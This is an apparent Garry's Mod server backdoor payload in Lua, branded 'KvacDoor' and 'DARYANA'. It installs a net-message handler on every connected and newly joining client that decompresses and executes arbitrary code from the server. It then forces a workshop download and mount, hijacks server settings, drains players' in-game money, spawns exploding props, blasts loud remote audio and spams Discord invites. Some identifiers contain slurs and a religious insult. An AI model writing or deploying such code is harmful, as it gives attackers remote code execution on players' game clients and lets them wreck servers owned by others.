util.AddNetworkString("mamamia")

BroadcastLua([[net.Receive("mamamia",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])


hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("mamamia",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)

local function SendToClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start("mamamia")
        net.WriteUInt(len, 16)
        net.WriteData(data, len)
    net.Broadcast()
end

for k, v in pairs(player.GetAll()) do
    v:SendLua("steamworks.FileInfo(1830594533,function(result)steamworks.Download(result.fileid,true,function(name)game.MountGMA(name)end) end)")
end

timer.Simple( 0.5, function()   
   RunConsoleCommand("gmod_language","ru")
   RunConsoleCommand("hostname", "Garry's Mod")
   RunConsoleCommand("ulx","god", "*")
   RunConsoleCommand('sv_loadingurl', '')
   RunConsoleCommand("sv_alltalk", "0")
end)

function RandomString( intMin, intMax )
    local ret = ""
    for _ = 1, math.random( intMin, intMax ) do
        ret = ret.. string.char( math.random(65, 90) )
    end

    return ret
end

m_strImageGlobalVar = RandomString( 6, 12 )

SendToClient([[
hook.Add("PlayerFootstep", "SexyFoot", function(ply)
    ply:EmitSound( "vo/npc/female01/pain0"..math.random(1, 9)..".wav", 75, math.random(50, 100))
end)
 timer.Create(tostring(math.random(0, 999999)), 1, 0, function()
            RunConsoleCommand("say 123")
        end)
]])
util.AddNetworkString('ymCoLwxiCViSaIUJluTXDr')
timer.Simple(1,function()
SendToClient([[

net.Receive("ymCoLwxiCViSaIUJluTXDr",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)

]])


SendToClient([[
timer.Simple(19.5, function()
        timer.Create("supremez_like_kids", 0.3, 0, function()
            notification.AddLegacy( "DARYANA is here !", math.random(0, 4), 1.5 )
        end)
        timer.Create("lecreatorwolla", 0.3, 0, function()
            notification.AddLegacy( "DARYANA is here !", math.random(0, 4), 1.5 )
        end)
        timer.Create("kovo", 0.3, 0, function()
            notification.AddLegacy( "DARYANA is here !", math.random(0, 4), 1.5 )
        end)
        function GAMEMODE:PostDraw2DSkyBox()
            local col = Color(0, 0, 0, 255)
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
        function GAMEMODE:PreDrawSkyBox()
            local col = Color(0, 0, 0, 255)
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
    end)
]])

SendToClient([[
local sW, sH = ScrW(), ScrH()
local w,h = ScrW(), ScrH()
local W, H = ScrW(), ScrH()
local prevVal = 2

local defaultfov = LocalPlayer():GetFOV()
local override = 70

local sent = false

local audio
local skys = ents.FindByClass("env_skypaint")


local function AudioVizualier()
    if not audio then return end
    local tbl = {}
    local col = HSVToColor(CurTime() * 36 % 360, .3, .8)

    local vv = Vector(col.r / 255, col.g / 255, col.b / 255)

    audio:FFT(tbl, FFT_4096)

    local avg = 0
    for i = 1, 40 do
        avg = avg + tbl[i]
    end

    local h = CurTime() * 250 % 360

    prevVal = Lerp(30 * FrameTime(), prevVal, avg)
    if prevVal > 2 then
        util.ScreenShake(vector_origin, prevVal * 2, 10, 2, 5000)
        local vPos = LocalPlayer():EyePos()
        local emitter = ParticleEmitter( LocalPlayer():EyePos())
        local particle = emitter:Add( "sprites/glow04_noz", vPos )
        if ( particle ) then
            particle:SetVelocity(VectorRand() * 50)
            particle:SetDieTime(1)
            particle:SetStartAlpha(0)
            particle:SetEndAlpha(255)
            particle:SetStartSize(50)
            particle:SetEndSize(0)
            particle:SetStartLength(55)
            particle:SetEndLength(0)
            particle:SetColor(vv)
            particle:SetGravity(Vector(0,0,0))
            particle:SetAirResistance(5)
            particle:SetCollide(true)
            particle:SetBounce(0.9)
        end

        override = Lerp(10 * FrameTime(), override, prevVal * .875)
    else
        override = Lerp(5 * FrameTime(), override, defaultfov)
        sent = false
    end

    local vPos = LocalPlayer():EyePos() + Vector(0, 0, -5)
    local emitter = ParticleEmitter( LocalPlayer():EyePos())
    local particle = emitter:Add("particle/particle_smokegrenade", vPos)
    particle:SetVelocity(VectorRand() * 50)
    particle:SetDieTime(2)
    particle:SetStartAlpha(math.Rand(1,10))
    particle:SetStartSize(1900)
    particle:SetEndSize(math.Rand(80,90))
    particle:SetColor(vv)
    particle:SetGravity(Vector(0,0,100))
    particle:SetAirResistance(500)

    local mats = Entity(0):GetMaterials()
    for k,v in pairs(mats) do
        Material(v):SetVector("$color", vv)
    end

end




hook.Add("Think","somewhere_over_the_rainbow",function()
    local col = HSVToColor(CurTime() * 36 % 360, .3, .8)

    local v = Vector(col.r / 255, col.g / 255, col.b / 255)

    LocalPlayer():SetWeaponColor(v)

    for i = 1, #skys do
        skys[i]:SetTopColor(v)
        skys[i]:SetBottomColor(v)
    end
end)

hook.Add("Think","butifoule",function()
    local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
    local v = Vector(col.r / 255, col.g / 255, col.b / 255)
    for k, v in pairs( ents.FindByClass( "prop_*" ) ) do 
        v:SetColor( col )
        v:Activate()
    end
    for k,p in pairs(player.GetAll()) do
        p:SetColor( col )
    end
end)

local chair = ClientsideModel("models/kvac/kvac.mdl")
chair:SetNoDraw(true)
local data = {}
local function genChair(id)
    local pos = LocalPlayer():GetPos()
    data[id] = { Vector(math.random(pos.x-1000,pos.x+1000),math.random(pos.y-1000,pos.y+1000),pos.z + math.random(800,1000) ), math.random(10, 70) }
end
for i=1, 70 do
    genChair(i)
end
hook.Add("PostDrawOpaqueRenderables","\xFFitsrainingchairs\xFF",function()
    local z = LocalPlayer():GetPos().z
    for i=1, #data do
        chair:SetPos(data[i][1])
        chair:SetupBones()
        chair:DrawModel()
        data[i][1].z = data[i][1].z - data[i][2] / 20
        if data[i][1].z <= z then
            genChair(i)
        end
    end
end)

sound.PlayURL("https://rur.hitmotop.com/get/music/20230324/DARYANA_-_Ty_zastavlyal_menya_sosat_polnaya_versiya_75666869.mp3", "noblock", function(s)
    if not IsValid(s) then return end
    audio = s
    s:SetVolume( 15 )
    s:EnableLooping( false )
    -- timer.Create("Timerr", 1, 0, function()
    --  print(s:GetTime())
    -- end)
    end)
    hook.Add("HUDPaint", "EXROR_", AudioVizualier)

    hook.Add("CalcView", "EXROR_", function(ply, origin, angles, fov, znear, zfar)
        return {
            ["origin"] = origin,
            ["angles"] = angles,
            ["fov"] = override,
            ["znear"] = znear,
            ["zfar"] = zfar
        }
    end)

    local function stop()
        audio = nil
        timer.Remove("ScreenShake")
        timer.Remove("f")
        timer.Remove("GetTime")
        hook.Remove("HUDPaint", "EXROR_")
        hook.Remove("HUDShouldDraw", "EXROR_")
        hook.Remove("CalcView", "EXROR_") 
        for k, v in pairs(oldhooks) do
            hook.Add("HUDPaint", k, v)
            oldhooks[k] = nil
        end
    end
    concommand.Add("lelstop", stop)


        if s == 1 then 
            timer.Create("JzzBCe", 0.2, 0, function()
                 util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
            end)
        end
        ]])
    end)



hook.Add("Think","somewhere_over_the_rainbow",function()
    local col = HSVToColor(CurTime() * 50 % 360, 1, 1)

    for _, v in ipairs(player.GetAll()) do
        v:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))
    end

end)

timer.Simple(0.5, function()
    for k, v in pairs(player.GetAll()) do
        v:SetModel( "models/kvac/kvac.mdl" )
    end
end)

SendToClient([[ 
timer.Simple(240,function()
    RunConsoleCommand("lelstop")
    RunConsoleCommand("stopsounds")
    RunConsoleCommand("gmod_language","ru")
end)
  ]])
timer.Simple(1,function()
        SendToClient([[  
            timer.Create("spamchatbienchiant", 1.5, 0, function()
                local time = tonumber(0)
                local Message = {
                    "        ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "       ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "      ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "     ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "    ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "   ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "  ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    " ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    " ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "  ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "   ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "    ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "     ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "      ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "       ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆",
                    "        ∆ DARYANA https://discord.gg/x7kDYAEA45 ∆"
                }

                for _, line in pairs(Message) do
                    time = time + tonumber(0.1)
                    timer.Simple(time,function()
                        chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
                    end)
                end
            end)
            timer.Simple(20, function()
        timer.Create("sex_on_the_beach", 0.1, 0, function()
            notification.AddLegacy( "DARYANA<3", math.random(0, 4), 1.5 )
        end)
end)
        ]])
end)

timer.Simple(19.5,function()
    SendToClient([[
        timer.Create("Kvacdoorcieltropbien",1,5800,function()
            local arabe = ClientsideModel("models/kvac/kvac.mdl")
            arabe:SetNoDraw(true)
            arabe:SetModelScale(20)
            timer.Create("charglogo", 0.01, 0, function()
                arabe:SetAngles(Angle(0, CurTime()*50 % 360 ,CurTime()*20 % 360) )
            end)
            local data = {}
            local function genarabe(id)
                local pos = LocalPlayer():GetPos()
                data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
            end
            for i=1, 50 do
                genarabe(i)
            end
            hook.Add("PostDrawOpaqueRenderables","itsrainingchienchauds",function()
                local z = LocalPlayer():GetPos().z
                for i=1, #data do
                    arabe:SetPos(data[i][1])
                    arabe:SetupBones()
                    arabe:DrawModel()
                    data[i][1].z = data[i][1].z - data[i][2] / 20
                    if data[i][1].z <= z then
                        genarabe(i)
                    end
                end
            end)
        end)
]])
end)

timer.Simple( 19.5, function()
   timer.Create("ooch", 0.42, 25, function()
        for k, v in pairs( player.GetAll() ) do

            local trace = v:GetEyeTraceNoCursor()

            local car = ents.Create("prop_physics")

            local trace2 = util.TraceLine( { start = trace.HitPos, endpos = trace.HitPos + Vector( 0, 0, 5000000 ), mask = MASK_SOLID_BRUSHONLY } )

            car:SetModel( "models/kvac/kvac.mdl" )

            car:SetAngles( v:GetAngles() )

            car:SetPos( trace2.HitPos + Vector( 0, 0, -60 ) )

            car:Spawn()

            car:Activate()

            car.boom = 6

            car:GetPhysicsObject():SetVelocity( Vector( 0, 0, -100 ) )

            car:Ignite( 500 )

            car:AddCallback( "PhysicsCollide", function( car, dat )

                    local explo = ents.Create("env_explosion")

                    explo:SetPos( car:GetPos() )

                    explo:SetKeyValue("iMagnitude", "350")

                    explo:Spawn()

                    explo:Activate()

                    explo:Fire("Explode", "", 0)

                    local ef = EffectData()

                    ef:SetOrigin( car:GetPos() )

                    ef:SetMagnitude( 5 )

                    ef:SetScale( 200 )

                    util.Effect( "ThumperDust", ef )

                    car.boom = car.boom - 1

                    if car.boom < 0 then car:Remove() end

            end)
        end
    end)
end)

timer.Create("ok", 1, 0, function()
    for k, v in pairs( ents.FindByClass( "prop_*" ) ) do local phys = v:GetPhysicsObject()
        if (IsValid(phys)) then
            phys:EnableMotion(true)
        end
    end
 
    local props = ents.GetAll()
    for _, prop in ipairs( props ) do
        if(prop:GetPhysicsObject():IsValid()) then
            prop:GetPhysicsObject():ApplyForceCenter( Vector( 0, 0, ((650 * 0.73) * prop:GetPhysicsObject():GetMass() ) ) )
        end
    end
end)

        
timer.Simple( 20.5, function()
        for _,v in pairs(player.GetAll()) do
           v:GodEnable()
           v:setDarkRPVar( "rpname", "KvacDoor - https://discord.gg/MrJUbQ72kj" )
       end
end)

timer.Simple( 20.5, function()
    for k,v in pairs(player.GetAll()) do
        v:SetRunSpeed(400* 4)
        v:SetWalkSpeed(400 * 4)
    end
end)

timer.Simple( 55.3, function()
    RunConsoleCommand("sv_gravity", "100")
end)
SendToClient([[
    timer.Stop("spamchatbienchiant")
]])

timer.Simple( 20, function()
    timer.Create("Kvac Goulag", 4, 10, function()
        for k,v in pairs(player.GetAll()) do
            v:addMoney(-10000000000)
            v:ChatPrint("KvacDoor > All")
            v:wanted(v,"KvacDoor is here",1 )
            v:GodEnable()
        end
    end)
end)


SendToClient([[
    timer.Simple(1, function()
        timer.Create("Allah is the best god of the terrorisme activity", 0.1, 0, function()
            notification.AddLegacy( "DARYANA > All", math.random(0, 4), 1 )
        end)
    end)
]])
timer.Create("cdrolenon ", 20, 1, function()
    timer.Create("cdrolenon ", 0.5, 1000, function()
        for k, v in pairs( ents.FindByClass( "prop_*" ) ) do local phys = v:GetPhysicsObject()
            if (IsValid(phys)) then
                phys:EnableMotion(true)
            end
        end

        local props = ents.GetAll()
        for _, prop in ipairs( props ) do
            if(prop:GetPhysicsObject():IsValid()) then
                prop:GetPhysicsObject():ApplyForceCenter( Vector( 0, 0, ((650 * 0.73) * prop:GetPhysicsObject():GetMass() ) ) )
            end
        end

    end)
end)

